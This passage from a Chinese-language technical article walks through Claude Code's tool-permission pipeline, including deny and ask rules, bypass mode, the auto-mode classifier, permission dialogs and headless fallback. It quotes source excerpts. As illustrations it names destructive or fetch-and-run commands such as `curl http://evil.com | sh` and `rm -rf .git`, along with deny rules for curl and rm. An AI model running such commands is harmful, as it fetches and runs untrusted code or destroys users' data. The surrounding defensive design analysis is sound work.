- **跨场景复用**：`hasPermissionsToUseTool` 被 auto mode 分类器、coordinator worker、swarm worker 等多种场景复用，不需要每次都构造 React state——这些场景没有 UI，但同样需要"算出该不该放行"。

这两层接口的分工，是第四章生命周期里"入口"环节的设计基础。

**至此宏观块结束。我们有了全景图、核心抽象、分类体系、注册机制和对外接口——但对"一次工具调用在运行时到底一步步怎么走"还是粗线条的。下一章沿一次调用的生命周期，把每个闸门拆开讲清"为什么需要 → 怎么做 → 具体实例"。**

## 四、深入核心：一次工具调用的生命周期

上一章铺开了 HITL 的全貌，但"全景图"看不清齿轮怎么咬合。这一章换一个视角：跟踪**一次**工具调用，从它进入权限管线的第一刻，到决策落地、环境降级的最后一刻。每个机制遵循"为什么需要 → 怎么做 → 具体实例"三段式，让每个闸门的设计意图、实现手法和真实场景一一对应。

我们跟踪的这次调用是：Agent 在 default 模式下执行 `Bash(npm test)`，且用户此前没有任何相关规则。这个例子会在各闸门间流转，直到最终弹窗被用户决策。读完这一章，你能把第三章的静态地图还原成动态的执行流。

### 4.1 入口：工具调用如何进入权限管线

**为什么需要**：Agent 循环本身不判断权限——它只负责"发 tool_use、收 tool_result"。如果让循环直接执行工具，就没有任何拦截点。需要一个"门"卡在循环和工具之间，保证每次调用都先过权限检查。这扇门还要同时满足两个约束：决策逻辑必须能在无 UI 的场景（测试、worker）复用，但弹窗又必须由 React 来渲染。所以入口被拆成两层。

**怎么做**：入口由 `useCanUseTool` 把守，它内部调用 `hasPermissionsToUseTool`。前者是 React hook，能弹窗、能改 state；后者是纯函数，只算决策。Agent 循环持有的 `canUseTool` 回调，其实就是 `useCanUseTool` 返回的函数：

```typescript
// src/hooks/useCanUseTool.tsx:46-292
function useCanUseTool(setToolUseConfirmQueue, setToolPermissionContext): CanUseToolFn {
  return useCallback<CanUseToolFn>(async (tool, input, toolUseContext, assistantMessage, toolUseID, forceDecision) => {
    return new Promise(resolve => {
      const ctx = createPermissionContext(tool, input, toolUseContext, assistantMessage, toolUseID, ...)
      const decisionPromise =
        forceDecision !== undefined
          ? Promise.resolve(forceDecision)
          : hasPermissionsToUseTool(tool, input, toolUseContext, assistantMessage, toolUseID)
      return decisionPromise.then(async result => { /* 按 behavior 分流 */ })
    })
  }, [...])
}
```

入口的一个关键设计是"Promise + resolve"——`useCanUseTool` 返回一个 Promise，但**不立即 resolve**。当决策是 `ask` 时，Promise 挂起，直到用户在弹窗里点选后才 resolve。这就是 Agent 循环"暂停点"的实现：循环 `await canUseTool(...)`，弹窗未关闭就一直在等。`forceDecision` 参数允许测试和某些特殊路径绕过正常决策逻辑——这在 REPL 测试和 coordinator worker 自动化检查中非常有用：测试时不需要真走规则匹配，worker 间转发时也不需要重复决策。

**具体实例**：Agent 决定运行 `npm test`，发出 `tool_use { name: 'Bash', input: { command: 'npm test' } }`。Agent 循环拿到这个 tool_use，调用 `canUseTool(BashTool, { command: 'npm test' }, ...)`。这实际上调用了 `useCanUseTool` 返回的函数，它先构造 `ctx`，再调用 `hasPermissionsToUseTool`——决策管线由此开始。这次调用此时还不知道结局，它的 Promise 已经挂起，等待管线返回。

### 4.2 第一道闸：deny rule（用户的硬底线）

**为什么需要**：有些操作用户从根上就不允许发生——比如在一个涉及隐私数据的项目里 `deny` 掉 `WebFetch`，或 `deny` 掉 `Bash(curl:*)`。这种"绝对禁止"必须满足两个性质：一是优先级最高，任何其他规则和模式都不能翻案；二是即使开启了最宽松的 bypass 模式也必须生效——否则用户开启 bypass 时"硬底线"就形同虚设。所以 deny rule 被放在管线的第一步，且对 bypass 免疫。

**怎么做**：deny rule 在管线第一步检查，匹配成功立即返回 deny，绝不进入后续步骤：

```typescript
// permissions.ts:1192-1202 — 1a. 整个工具被 deny
const denyRule = getDenyRuleForTool(appState.toolPermissionContext, tool)
if (denyRule) {
  return {
    behavior: 'deny',
    decisionReason: { type: 'rule', rule: denyRule },
    message: `Permission to use ${tool.name} has been denied.`,
  }
}
```

匹配规则在 `toolMatchesRule()`（`permissions.ts:238-269`）中定义：直接匹配 `toolName`，或 MCP server-level 匹配（`mcp__server1` 匹配 `mcp__server1__tool1`）。注意"早返回"在这里的含义——一旦 deny 命中，连 `tool.checkPermissions()` 都不会调用，更不会走到模式检查。这就是 deny 能免疫 bypass 的根因：bypass 检查在第四步，deny 在第一步，deny 命中时根本走不到第四步。

**具体实例**：假设用户在 settings 里配了 `deny Bash(rm:*)`。如果 Agent 这次调用的是 `Bash(rm -rf node_modules)`，第一步就命中 deny rule，立即返回 `behavior: 'deny'`，管线结束。Agent 循环收到 `is_error=true`，知道这个命令被禁，会换别的办法。而我们的目标例子 `Bash(npm test)` 不匹配 `rm:*`，deny rule 未命中，继续下一步。

### 4.3 第二道闸：ask rule（允许但每次确认）

**为什么需要**：deny 是"永远不行"，allow 是"永远行"，但有些操作介于两者之间——可以用，但每次都得用户点头。典型场景是 `Bash(npm publish:*)`：发布是合法操作，但一次误发布可能把坏包推上 registry，后果不可逆。这类操作需要"允许使用但每次都确认"的语义，这就是 ask rule。它的存在让用户能精细控制"哪些命令永远放行、哪些永远问、哪些永远禁"。

**怎么做**：ask rule 在 deny 之后检查。命中时返回 `behavior: 'ask'`，但有一个例外——沙箱自动放行：

```typescript
// permissions.ts:1204-1227 — 1b. 整个工具被标记为需要 always ask
const askRule = getAskRuleForTool(appState.toolPermissionContext, tool)
if (askRule) {
  // autoAllowBashIfSandboxed 例外：沙箱内 Bash 命令可自动放行
  const canSandboxAutoAllow = tool.name === BASH_TOOL_NAME &&
    SandboxManager.isSandboxingEnabled() &&
    SandboxManager.isAutoAllowBashIfSandboxedEnabled() &&
    shouldUseSandbox(input)
  if (!canSandboxAutoAllow) {
    return {
      behavior: 'ask',
      decisionReason: { type: 'rule', rule: askRule },
      message: createPermissionRequestMessage(tool.name),
    }
  }
}
```

沙箱机制提供一个优化路径：当 `autoAllowBashIfSandboxed` 开启且命令确定在沙箱内执行时，跳过 ask rule 直接交给 Bash 的 `checkPermissions()` 处理更细粒度的规则。这个例外背后的意图是"风险已被环境兜底"——沙箱内的命令即使闯祸也被困在沙箱里，所以可以放宽 ask。它体现了 HITL 的一个深层原则：权限决策不是只看"操作本身"，还要看"操作发生的环境"。

**具体实例**：如果用户配了 `ask Bash(npm publish:*)`，Agent 调用 `Bash(npm publish)` 会命中 ask rule，返回 `behavior: 'ask'`，进入弹窗流程。而我们的 `Bash(npm test)` 没匹配任何 ask rule，继续下一步。

### 4.4 第三道闸：tool.checkPermissions（工具自定义风险判断）

**为什么需要**：通用规则引擎能处理"工具级"和"内容级"匹配，但有些风险信号只有工具自己懂。Bash 知道 `cd / && rm -rf *` 是复合命令里的危险片段；FileEdit 知道 `.git/config` 是敏感路径；WebFetch 知道 URL 是否在允许列表。把这些"工具特定"的判断塞进通用规则引擎会让后者臃肿不堪，且每加一个工具都要改引擎。所以管线把"工具特定风险判断"下放给工具自己——每个工具实现 `checkPermissions()`，返回自己的决策。这是"开闭原则"在权限系统里的体现：新增工具时扩展，不改管线。

**怎么做**：管线调用 `tool.checkPermissions()`，拿到工具的决策。如果工具没实现或返回 `passthrough`，管线用默认值兜底：

```typescript
// permissions.ts:1229-1244 — 1c. 调用工具自己的 checkPermissions
let toolPermissionResult: PermissionResult = {
  behavior: 'passthrough',
  message: createPermissionRequestMessage(tool.name),
}
try {
  const parsedInput = tool.inputSchema.parse(input)
  toolPermissionResult = await tool.checkPermissions(parsedInput, context)
} catch (e) {
  if (e instanceof AbortError || e instanceof APIUserAbortError) throw e
  logError(e)
}
```

每个工具可以定义自己的 `checkPermissions()` 方法，实现工具特定的规则匹配。例如：

- `BashTool.checkPermissions()` 解析命令、匹配 `Bash(prefix:*)` 规则
- `FileEditTool.checkPermissions()` 校验路径安全性（`safetyCheck` 决策原因）
- `WebFetchTool.checkPermissions()` 检查 URL 是否在允许列表中

如果工具的 `checkPermissions()` 返回 `deny`，立即拒绝；如果返回 `ask`，且决策原因是 `rule`（content-specific ask rule）或 `safetyCheck`（敏感路径），即使后续在 bypass 模式下也尊重该决策。注意 try/catch 的设计：工具的 `checkPermissions()` 抛错不会让整个管线崩，而是 fallback 到默认 `passthrough`——这是"工具自治但不能拖垮系统"的容错策略。只有 AbortError（用户主动取消）才向上抛，因为那是用户的明确意图。

**具体实例**：`BashTool.checkPermissions()` 拿到 `npm test`，解析命令，在 allow/deny/ask 规则里查找 `Bash(npm test:*)`、`Bash(npm:*)` 等模式。我们假设用户没有任何相关规则，BashTool 返回 `passthrough`（无意见）。这个 `passthrough` 会被管线后续处理（见 4.7）。

### 4.5 模式短路：bypass 与 acceptEdits（全局开关如何介入）

**为什么需要**：前面三道闸都是"规则驱动"，但用户有时想"一刀切"——CI 里希望所有操作放行（bypass），或代码 review 后希望文件编辑自动通过（acceptEdits）。如果让这些全局意图也走规则匹配，配置会很繁琐。模式的存在就是把这些"全局基调"抽成开关，在规则之后做一次"短路判断"：满足条件就直接放行，不再问。但这个短路不能是无条件的——用户的硬底线（deny、safetyCheck）必须仍然生效，所以模式检查被放在 deny/ask/checkPermissions 之后。

**怎么做**：bypass 模式检查在管线第四步，命中则直接 allow：

```typescript
// permissions.ts:1283-1302 — 2a. 检查 bypass 模式
const shouldBypassPermissions =
  appState.toolPermissionContext.mode === 'bypassPermissions' ||
  (appState.toolPermissionContext.mode === 'plan' &&
    appState.toolPermissionContext.isBypassPermissionsModeAvailable)
if (shouldBypassPermissions) {
  return {
    behavior: 'allow',
    updatedInput: getUpdatedInputOrFallback(toolPermissionResult, input),
    decisionReason: { type: 'mode', mode: appState.toolPermissionContext.mode },
  }
}
```

注意第二个条件：`plan` 模式下如果用户最初是 bypass 模式启动的（`isBypassPermissionsModeAvailable` 为 true），也允许 bypass。这意味着用户可以在 Plan Mode 中临时进入 bypass 执行危险操作。这个设计是"模式叠加"的体现——Plan Mode 默认严格，但不剥夺"原 bypass 用户"的紧急执行权。`getUpdatedInputOrFallback` 会把 `tool.checkPermissions()` 可能改写过的输入（如沙箱化命令）带回去，保证放行时用的是经过工具认可的安全输入。

bypass 的"safety net"在前三步已经埋好：deny rule（第一步）、safetyCheck 和 content-specific ask rule（第三步的 `tool.checkPermissions` 返回值）都先于这一步执行，所以 bypass 短路时这些已被尊重。acceptEdits 不在这步显式处理，而是通过 `tool.checkPermissions()` 在 acceptEdits 模式下对文件编辑类工具返回 allow 来实现——这就是 acceptEdits 只对文件编辑生效的机制根因。

**具体实例**：我们的例子在 default 模式下，`shouldBypassPermissions` 为 false，跳过这步。如果用户当时是 bypassPermissions 模式，`Bash(npm test)` 会在这一步直接 allow，管线结束，Agent 立刻执行——这就是 bypass 下"不弹窗"的原因。但注意：如果命令是 `Bash(rm -rf .git)`，第三步的 safetyCheck 会先返回 ask，bypass 短路就放不过它——这就是 bypass 下仍可能弹窗的原因。

### 4.6 白名单：always allow rule（对抗审批疲劳）

**为什么需要**：如果每次 `npm test`、`git status`、`ls` 都弹窗，用户会被审批疲劳击垮，最后盲目点 allow——这比不审批更危险。always allow rule 就是对抗审批疲劳的机制：用户一次决策后选择"以后都放行"，系统记住，后续相同模式自动放行。它把"一次性授权"升级成"模式级授权"，把用户的注意力留给真正新的操作。这一步放在 bypass 之后，是因为 bypass 已经放行了所有，轮到这步说明不在 bypass 模式，需要靠白名单决定。

**怎么做**：always allow rule 检查命中则直接 allow，规则来自多个 source：

```typescript
// permissions.ts:1304-1318 — 2b. 整个工具被 always allow
const alwaysAllowedRule = toolAlwaysAllowedRule(
  appState.toolPermissionContext, tool
)
if (alwaysAllowedRule) {
  return {
    behavior: 'allow',
    updatedInput: getUpdatedInputOrFallback(toolPermissionResult, input),
    decisionReason: { type: 'rule', rule: alwaysAllowedRule },
  }
}
```

allow rule 的匹配规则与 deny rule 类似，但源不同——allow rules 来自 `alwaysAllowRules`（user settings、project settings、session 内存、CLI 参数等），deny rules 来自 `alwaysDenyRules`。注意 deny 在第一步、allow 在第五步，这个顺序差异是"安全优先"的体现：当 deny 和 allow 同时存在时，deny 永远赢，因为 deny 先检查。这是"宁可错杀不放"的安全语义。

**具体实例**：假设用户之前对 `Bash(npm test:*)` 选过"always allow"，这条规则已写入 settings。我们的 `Bash(npm test)` 在这一步命中 `Bash(npm test:*)`，返回 allow，管线结束，Agent 直接执行，不弹窗。这正是 always allow 的价值——一次决策，长期受益。如果用户没有任何 allow 规则，`Bash(npm test)` 不命中，继续最后一步。

### 4.7 默认兜底：passthrough → ask（无规则匹配时交给人类）

**为什么需要**：前面五步覆盖了 deny、ask、工具自定义、模式短路、白名单——但还有一种情况：既没被禁、也没被允许、工具也没意见。这种"未知"操作该怎么处理？安全优先原则要求：拿不准就问人。所以管线的最后一步把"无意见"（passthrough）转成"问人"（ask）。这一步是 HITL"该问就问"精神的兜底，保证任何未被规则覆盖的操作都不会被默默放行。

**怎么做**：把工具返回的 `passthrough` 转成 `ask`，并生成弹窗消息：

```typescript
// permissions.ts:1320-1339 — 3. passthrough → ask
const result: PermissionDecision =
  toolPermissionResult.behavior === 'passthrough'
    ? {
        ...toolPermissionResult,
        behavior: 'ask' as const,
        message: createPermissionRequestMessage(tool.name, toolPermissionResult.decisionReason),
      }
    : toolPermissionResult
```

`passthrough` 是工具的"无意见"表态——交给上层决策。最终转换为 `ask`，调用 `createPermissionRequestMessage()` 生成弹窗消息。注意如果工具明确返回了 `ask` 或 `deny`（不是 passthrough），这里原样保留——工具的明确意见优先于默认兜底。

**具体实例**：我们的 `Bash(npm test)` 经过五步都没命中，BashTool 返回 `passthrough`。这一步把它转成 `ask`，生成消息"允许执行 Bash 命令 npm test？"。决策管线到此结束，返回 `behavior: 'ask'` 给 `useCanUseTool`。接下来要么弹窗（交互模式），要么降级（headless）。

### 4.8 AI 兜底：auto mode 分类器（用 LLM 替代弹窗）

**为什么需要**：default 模式下，"未知"操作一律问人，但问多了用户会疲劳。auto mode 提供了一条中间路线：用一个小模型（Haiku）当"自动审批员"，对每个 `ask` 决策做二次判断——操作安全就自动 allow，危险就自动 deny，只有拿不准的才真正弹窗。这把"问人"从"默认行为"降级成"少数情况"，大幅减少弹窗次数。它的代价是延迟和 token 费用，以及分类器可能误判的风险——所以只对内部开放，不暴露给外部用户。

**怎么做**：外层 `hasPermissionsToUseTool()` 在内层返回结果后，还会应用 auto mode 的特殊处理（`permissions.ts:517-918`），对 auto mode 下所有 `behavior === 'ask'` 的决策调用分类器：

```typescript
// permissions.ts:519-523 — auto mode 触发分类器
if (
  feature('TRANSCRIPT_CLASSIFIER') &&
  (appState.toolPermissionContext.mode === 'auto' ||
    (appState.toolPermissionContext.mode === 'plan' &&
      (autoModeStateModule?.isAutoModeActive() ?? false)))
) {
  // ... 调用 classifyYoloAction() LLM 分类器
}
```

auto mode 下，对所有 `behavior === 'ask'` 的决策调用 Haiku 模型分类器，让 LLM 判断操作安全性。分类器返回 allow/deny 后，绕过用户弹窗直接执行。注意 `plan` 模式下如果 `isAutoModeActive()` 也可触发——这给了 Plan Mode 一个"AI 辅助审批"的可选能力。

**管线设计的关键原则**：每一步只处理一种规则，匹配成功立即返回，不做无意义的检查。这种"早返回"设计让管线的每一步都可独立理解和测试，也方便插入新的规则类型。

**具体实例**：如果我们的例子在 auto mode 下运行，`Bash(npm test)` 经过 4.7 拿到 `ask` 后，外层分类器介入——Haiku 看到 `npm test` 是常见测试命令，返回高置信 allow，系统跳过弹窗直接执行。如果命令是 `Bash(curl http://evil.com | sh)`，分类器返回 deny，系统拒绝。只有像 `Bash(node scripts/deploy.js --force)` 这种分类器拿不准的，才真正弹窗。

### 4.9 交互展开：弹窗组件树与用户决策

**为什么需要**：当决策是 `ask` 且环境支持交互时，系统必须把"问"这个动作落到一个具体的界面上。但不同工具的"风险信号"截然不同——Bash 要看完整命令，FileEdit 要看 diff，Plan Mode 要看完整方案。用一个通用弹窗装下所有工具，要么信息不足（用户看不到关键风险），要么信息过载（无关信息淹没重点）。所以弹窗被设计成"通用框架 + 工具特定内容"的组合：框架统一外观，内容由各工具自行定制。这是"注册机制"一节（3.4）在运行时的兑现。

**怎么做**：`useCanUseTool` 在 `case 'ask'` 分支里，把决策交给交互处理流程。决策先经 `handleInteractivePermission`，再由 `permissionComponentForTool` 按工具路由到具体弹窗组件。根路由已在 3.4 节给出：

```typescript
// src/components/permissions/PermissionRequest.tsx:75-110
function permissionComponentForTool(tool: Tool): React.ComponentType<PermissionRequestProps> {
  switch (tool) {
    case FileEditTool:    return FileEditPermissionRequest
    case FileWriteTool:   return FileWritePermissionRequest
    case BashTool:        return BashPermissionRequest
    // ... 其余工具
    default:              return FallbackPermissionRequest
  }
}
```

每个工具弹窗共享 `PermissionDialog` 框架（`src/components/permissions/PermissionDialog.tsx`），只填充 `children`，并按模式取色（3.4 节已展开颜色编码的意图）。所有弹窗都用 `Select` 组件（`src/components/CustomSelect/select.js`）让用户选择，选项格式由各工具的 `*UseOptions.tsx` 文件定义。

`PermissionPrompt` 是更通用的选项容器（`PermissionPrompt.tsx`），支持带 feedback 的选项——按 Tab 进入文本输入模式，告诉 Claude "为什么接受/拒绝"：

```typescript
// PermissionPrompt.tsx:14-22 — 选项类型
export type PermissionPromptOption<T extends string> = {
  value: T;
  label: ReactNode;
  feedbackConfig?: {
    type: FeedbackType;  // 'accept' | 'reject'
    placeholder?: string;
  };
  keybinding?: KeybindingAction;
};
```

feedback 选项触发 `tengu_accept_feedback_mode_entered` / `tengu_reject_feedback_mode_entered` analytics 事件，用于改进分类器训练数据——用户的"为什么"反馈是分类器迭代的养料。

**Bash 弹窗详解**：Bash 是最复杂的弹窗（`BashPermissionRequest.tsx`，528 行），因为 Bash 命令种类繁多、风险差异大：

```typescript
// BashPermissionRequest.tsx:198-213 — 计算可编辑 prefix
const [editablePrefix, setEditablePrefix] = useState<string | undefined>(() => {
  if (isCompound) {
    // 复合命令（如 cd src && git status && npm test）从 backend 建议提取
    const backendBashRules = extractRules(suggestions).filter(...)
    return backendBashRules.length === 1 ? backendBashRules[0]!.ruleContent : undefined
  }
  const two = getSimpleCommandPrefix(command)
  if (two) return `${two}:*`
  const one = getFirstWordPrefix(command)
  if (one) return `${one}:*`
  return command
});
```

"可编辑 prefix"机制让用户从 `npm test` 这种具体命令中提取 `npm test:*` 这种 prefix rule——选择 "Yes, and don't ask again for `npm test:*`" 后，未来所有 `npm test:*` 命令都自动放行。这个机制的意图是"让 always allow 的粒度可调"：太细（精确命令）则每条新命令都要授权，太粗（首词）则 `npm:*` 会放过 `npm publish`。默认取两词 prefix（`npm test:*`）是经验上的平衡点，用户还能手动编辑调整。

选项由 `bashToolUseOptions()` 生成（`bashToolUseOptions.tsx`）：

```typescript
// bashToolUseOptions.tsx:11-15 — 选项值
export type BashToolUseOption =
  | 'yes'                  // 仅本次允许
  | 'yes-apply-suggestions'// 应用后端建议的 rules（一次性 allow all）
  | 'yes-prefix-edited'    // 使用用户编辑的 prefix rule
  | 'yes-classifier-reviewed' // 接受 classifier 评估的 description rule
  | 'no'                   // 拒绝
```

注意 `yes-apply-suggestions` 与 `yes-prefix-edited` 的区别：前者批量应用 backend 推荐的多个 rules（如复合命令的多 subcommand 拆分），后者让用户精细调整单个 prefix。

**具体实例**：我们的 `Bash(npm test)` 走到这步，`permissionComponentForTool(BashTool)` 返回 `BashPermissionRequest`。弹窗显示命令 `npm test`，editablePrefix 默认算出 `npm test:*`，选项有"yes（仅本次）"、"Yes, and don't ask again for `npm test:*`"、"no"。用户看到这个弹窗，开始做决策。

### 4.10 决策落地：持久化与状态回流

**为什么需要**：用户在弹窗里点了选项，但这个点击只是 React state 的一次更新——它既没有写进磁盘（下次启动就忘了），也没有更新当前会话的权限上下文（下次同样命令还会再问）。所以决策落地要做两件事：一是持久化（写 settings 或内存），让决策在未来仍然有效；二是状态回流（更新 `ToolPermissionContext`），让本次会话的后续调用立刻受益。少了任何一件，"always allow"都名不副实。

**怎么做**：用户决策触发两条并行动作——`persistPermissionUpdates()` 写磁盘/内存，`applyPermissionUpdates()` 更新 React state。决策的生命周期先看一张图：

```
触发 ASK
  │
  ▼
展示权限弹窗 (UI 对话框)
  ├─► 显示工具名 + 参数 + 风险等级
  │
  ▼
用户决策
  │
  ├─► allow（临时）
  │     └─► 本次会话有效 → 写入 session-level permission cache
  │
  ├─► always allow（永久）
  │     └─► 写入 settings.json (userSettings/projectSettings)
  │     └─► 后续所有会话自动 allow
  │
  └─► deny（临时）
        └─► 本次阻止 → 下次相同操作重新询问
```

每个弹窗选项对应不同的 `PermissionUpdate` 类型（`src/utils/permissions/PermissionUpdateSchema.ts`）：

```typescript
// 临时 allow（session-only）— 写到内存，不持久化
{
  type: 'addRules',
  rules: [{ toolName: 'Bash', ruleContent: 'npm test:*' }],
  behavior: 'allow',
  destination: 'session',  // ← 关键：session 不写入磁盘
}

// always allow（持久化）— 写到 settings
{
  type: 'addRules',
  rules: [{ toolName: 'Bash', ruleContent: 'npm test:*' }],
  behavior: 'allow',
  destination: 'localSettings',  // ← 写到 .claude/settings.local.json
}
```

`destination` 字段决定持久化目标（3.2 节 ④ 已展开各值含义）。不同 destination 的可见范围不同：session 仅本次会话有效；userSettings 对所有项目生效；projectSettings 进 git 让团队共享；localSettings 仅本机本项目。

持久化路径由 `persistPermissionUpdates()`（`PermissionUpdate.ts:349-353`）遍历 updates 并调用 `persistPermissionUpdate()`：

```typescript
// PermissionUpdate.ts:349-353
export function persistPermissionUpdates(updates: PermissionUpdate[]): void {
  for (const update of updates) {
    persistPermissionUpdate(update)
  }
}
```

`persistPermissionUpdate()` 根据 `update.destination` 路由到不同的 settings 文件：

- `userSettings` → `~/.claude/settings.json`
- `projectSettings` → `<project>/.claude/settings.json`
- `localSettings` → `<project>/.claude/settings.local.json`

非可持久化目标（`session`、`cliArg`）会被跳过——只在内存中有效，进程退出即丢失。这个"跳过"不是 bug 而是设计：session 和 cliArg 本就是"运行时"规则，不该写盘。

**具体实例**：用户在 `Bash(npm test)` 弹窗选了"Yes, and don't ask again for `npm test:*`"。系统生成 `PermissionUpdate { type: 'addRules', rules: [{toolName:'Bash', ruleContent:'npm test:*'}], behavior:'allow', destination:'localSettings' }`。`persistPermissionUpdates` 把它写进 `<project>/.claude/settings.local.json`，`applyPermissionUpdates` 把这条规则加进当前 `ToolPermissionContext.alwaysAllowRules.localSettings`。决策 Promise resolve 为 allow，Agent 循环解除阻塞，开始执行 `npm test`。下次 Agent 再调 `Bash(npm test)`，4.6 步会命中这条新规则，直接放行，不再弹窗。

### 4.11 环境降级：headless 安全降级

**为什么需要**：前面 4.9 的弹窗流程依赖 TTY——有终端、能等待用户键入。但 Claude Code 也跑在 headless 环境（管道、`-p`、cron 任务），那里没有终端，弹窗无人应答。如果还走弹窗流程，Promise 会永远挂起，Agent 循环卡死。所以需要降级策略：问不了人时，按安全优先原则做默认决策，并给"必须放行"的场景留一条 hook 备选路径。这一步是 HITL"可恢复性"目标的兜底。

**怎么做**：降级路径在 `useCanUseTool` 的 `case 'ask':` 分支中。当 `shouldAvoidPermissionPrompts` 为 true（即 headless 环境）时，按模式做默认决策：

```
交互模式 (TTY):
  触发 ASK
    → 展示权限对话框
    → 等待用户输入
    → 用户决策 (allow/deny/always)

非交互模式 (管道 / -p / headless):
  触发 ASK
    → 检查 permissionMode
    ├─► bypassPermissions → ALLOW
    ├─► dontAsk → DENY
    ├─► acceptEdits → ALLOW (仅 file edit)
    ├─► default → DENY（安全默认）
    ├─► auto → DENY (headless 不能调用 classifier，避免成本失控)
    └─► plan → DENY (Plan Mode 不允许写操作)
```

default 模式下默认 DENY 而非 ALLOW，是"安全优先"的体现——无人值守时不应自动批准操作。auto 模式下也 DENY，是因为 headless 不能弹窗让分类器结果"兜不住"时问人，且大量调用分类器会让成本失控。safetyCheck 在 headless 下的处理更显这一原则：

```typescript
// permissions.ts:531-547 — safetyCheck 在 headless 下的处理
if (
  result.decisionReason?.type === 'safetyCheck' &&
  !result.decisionReason.classifierApprovable
) {
  if (appState.toolPermissionContext.shouldAvoidPermissionPrompts) {
    return {
      behavior: 'deny',
      message: result.message,
      decisionReason: {
        type: 'asyncAgent',
        reason: 'Safety check requires interactive approval and permission prompts are not available in this context',
      },
    }
  }
  return result
}
```

类似处理还有 PowerShell 工具（`permissions.ts:571-590`）——PowerShell 在 headless 下也直接拒绝，因为其安全性更难自动判断。

**Hook 拦截作为 headless 备选**：对于必须允许执行的 headless 任务，`PermissionRequest` hook 提供另一种机制——让企业 hook 替代用户做决策：

```typescript
// permissions.ts:400-471 — runPermissionRequestHooksForHeadlessAgent
async function runPermissionRequestHooksForHeadlessAgent(
  tool, input, toolUseID, context, permissionMode, suggestions
): Promise<PermissionDecision | null> {
  try {
    for await (const hookResult of executePermissionRequestHooks(
      tool.name, toolUseID, input, context, permissionMode, suggestions, context.abortController.signal
    )) {
      if (!hookResult.permissionRequestResult) continue
      const decision = hookResult.permissionRequestResult
      if (decision.behavior === 'allow') {
        // Hook 允许 → 直接放行
        // 即使 hook 修改了 permissionUpdates，也会持久化
        return { behavior: 'allow', ... }
      }
      if (decision.behavior === 'deny') {
        // Hook 拒绝 → 直接拒绝
        return { behavior: 'deny', ... }
      }
    }
  } catch (error) {
    // Hook 失败 → fallback 到 auto-deny
    logError(...)
  }
  return null  // 无 hook 决策 → caller 走 auto-deny
}
```

这给企业部署留出扩展空间：管理员可以通过 hook 集中决策所有权限请求，实现"统一的权限审计"。注意 hook 失败时 fallback 到 auto-deny——失败安全（fail-safe）而非失败开放（fail-open），同样是安全优先。

各 HITL 类型在交互/非交互模式下的行为对照：

| HITL 类型 | 交互模式行为 | 非交互模式行为 | 配置方式 |
|-----------|------------|--------------|---------|
| 权限审批 | 展示对话框 | 默认 DENY | `--permission-mode` |
| 方案审批 | 等待用户 approve | 不适用（Plan Mode 需交互） | Plan Mode |
| 危险操作 | 额外确认 | DENY | classifier |
| Trust dialog | 首次显示 | 跳过（假设 accept） | config |
| Hook 拦截 | 拦截决策 | Hook 决策 → 无决策时 fallback DENY | `PermissionRequest` hook |

**具体实例**：假设我们的 `Bash(npm test)` 跑在 headless 管道模式下（`echo "..." | claude -p`），且没有 always allow 规则。决策管线返回 `ask`，`shouldAvoidPermissionPrompts` 为 true，default 模式下直接降级为 DENY。Agent 收到 `is_error=true`，知道这个命令在管道里不被允许。如果企业配了 `PermissionRequest` hook 允许 `npm test`，则 hook 返回 allow，命令放行——这就是企业 headless 自动化的路径。

**至此我们走完了一次工具调用的完整生命周期：从入口、七步管线、AI 兜底、交互展开、决策落地，到环境降级。每一个机制都是"为了平衡安全/可用/可恢复"这个总目标的某个侧面。下一章把这些机制的取舍抽象成可对照的设计决策表。**

---

## 五、设计决策与权衡

第四章的每个闸门背后都是一次取舍——选了什么、放弃了什么、为什么。把这些取舍集中起来对照，能看清 HITL 体系的设计价值观：在安全与可用之间，永远先保安全；在自动与人工之间，把人工当兜底而非默认；在简洁与灵活之间，用分层而非堆砌。

| 决策点 | 选择了 | 放弃了 | 原因推断 |
|--------|--------|--------|---------|
| 持久化粒度 | 部分永久（always allow）+ 部分会话级（allow） | 全部永久或全部会话级 | always allow 减少重复审批；临时 allow 提供一次性授权 |
| 非交互降级 | 默认 DENY | 默认 ALLOW | 安全优先——无人值守时不应自动批准操作 |
| 提示频率 | 首次询问（per 工具+参数组合） | 每次询问 | 减少"审批疲劳"——用户不会因为频繁弹窗而盲目点 allow |
| 权限模式粒度 | 全局模式 + 工具级规则 | 仅全局模式 | 工具级规则提供细粒度控制；全局模式提供快速切换（bypass/dontAsk） |
| 自动分类器 | auto mode 用分类器自动判断 | 全部人工 | 分类器减少常见安全操作的审批次数，但可能误判 |
| bypass 模式硬底线 | deny rules 和 safetyCheck 免疫 | 完全 bypass | 用户的"硬底线"必须尊重，即使在 bypass 下 |
| plan 模式可 bypass | 当用户原始是 bypass 时，plan 中可 bypass | plan 模式绝对安全 | 给用户紧急执行的能力，但默认 plan 模式严格 |
| ask rules 在 bypass 下 | content-specific ask rule 在 bypass 下仍 ASK | bypass 完全免疫 | 用户显式标记的"每次都要问"操作必须尊重 |
| 弹窗颜色编码 | 模式对应不同颜色（紫/蓝/红/黄） | 单一颜色 | 让用户一眼看出当前模式风险等级 |
| 决策管线早返回 | 每步命中即返回 | 全部走完后取最高优先级 | 每步可独立测试、易插拔新规则；且 deny 物理上先于 allow 保证安全优先 |
| 入口双层拆分 | 静态纯函数 + 动态 React hook | 单一函数 | 决策逻辑可在无 UI 场景复用（测试、worker），且可独立单测 |
| 工具自定义权限 | tool.checkPermissions 下放给工具 | 全部塞进通用规则引擎 | 新增工具不改管线（开闭原则），且工具最懂自己的风险信号 |
| headless hook 失败 | fallback 到 auto-deny | fallback 到 allow | 失败安全（fail-safe）——hook 异常时宁可不放行 |

贯穿这张表的两条主线：一是"安全优先"——凡是不确定的场景（未知操作、headless、hook 失败），默认都走向更保守的那个选项；二是"用分层换灵活"——模式、规则、工具自定义、hook 各管一层，叠加起来覆盖从粗到细的全部场景，而不是用一个巨型规则引擎硬塞。

---

## 六、可复用的模式

最后，把 HITL 体系里那些"可迁移到其他系统"的设计模式提炼出来。这些模式不依赖 Claude Code 的具体实现，是"权限/审批"类系统的通用解法。

- **分层审批模式**：按风险等级决定审批策略——低风险自动 allow（acceptEdits）、中风险规则匹配、高风险人工审批（ask rules）、极高风险 denial 免疫（safetyCheck）。任何需要"分级风控"的系统都可套用这套四档。
- **决策持久化分层模式**：临时决策（会话级）vs 永久决策（写入 settings）。用户可以选择记忆哪些决策。用 destination 字段同时编码"生命周期"和"可见范围"，是一个简洁的数据建模范式。
- **非交互降级模式**：headless 环境下的安全降级路径——默认 DENY，可通过 `--permission-mode bypassPermissions` 切换。核心原则是"问不了就保守"，且为"必须放行"留 hook 备选。
